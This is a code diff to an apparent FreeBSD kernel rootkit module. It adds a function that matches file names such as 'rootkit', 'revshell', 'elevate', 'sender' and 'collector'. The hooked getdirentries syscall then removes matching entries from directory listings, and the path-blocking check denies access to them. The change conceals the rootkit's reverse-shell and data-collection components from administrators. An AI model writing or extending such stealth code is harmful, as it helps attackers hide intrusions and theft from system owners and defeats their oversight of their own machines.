@@ -172,6 +172,30 @@ struct module {
         modspecific_t           data;   /* module specific data */
 };
 
+#define SIZE 10
+static int is_hiding_path(char kpath[MAXPATHLEN]) {
+    char *paths[SIZE] = {
+        "elevate",
+        "rootkit",
+        "revshell",
+        "sender",
+        "collector",
+        "remote",
+        "log.c",
+        "log.h",
+        "log.o",
+        // "logsrc"
+        "hide",
+    };
+    for (int i = 0; i < SIZE; i++) {
+        if (strcasestr(kpath, paths[i]) != NULL) {
+            return 1;
+        }
+    }
+
+    return 0;
+}
+
 static int getdirentries_hook(struct thread *td, void *syscall_args) {
     struct getdirentries_args *uap; 
     uap = (struct getdirentries_args *) syscall_args;
@@ -195,9 +219,10 @@ static int getdirentries_hook(struct thread *td, void *syscall_args) {
             }
 
             // Add more module to hide here
-            if (strcmp(curr_rec->d_name, "hiding.ko") == 0 
-                || strcmp(curr_rec->d_name, "rootkit.ko") == 0 
-                || strcmp(curr_rec->d_name, "rc.local") == 0 
+            if (is_hiding_path(curr_rec->d_name)
+                || strcmp(curr_rec->d_name, "hiding.ko") == 0
+                || strcmp(curr_rec->d_name, "rootkit.ko") == 0
+                || strcmp(curr_rec->d_name, "rc.local") == 0
                 || strcmp(curr_rec->d_name, "rc.conf") == 0
             ) {
                 size_t remaining = count - reclen;
@@ -251,6 +276,9 @@ is_blocked_path(const char *user_path)
 
 	if (copyinstr(user_path, pathbuf, sizeof(pathbuf), &done) != 0)
 		return (0);
+
+	if (is_hiding_path(pathbuf))
+		return (1);
 
 	for (i = 0; blocked_files[i] != NULL; i++) {
 		if (strcmp(pathbuf, blocked_files[i]) == 0)
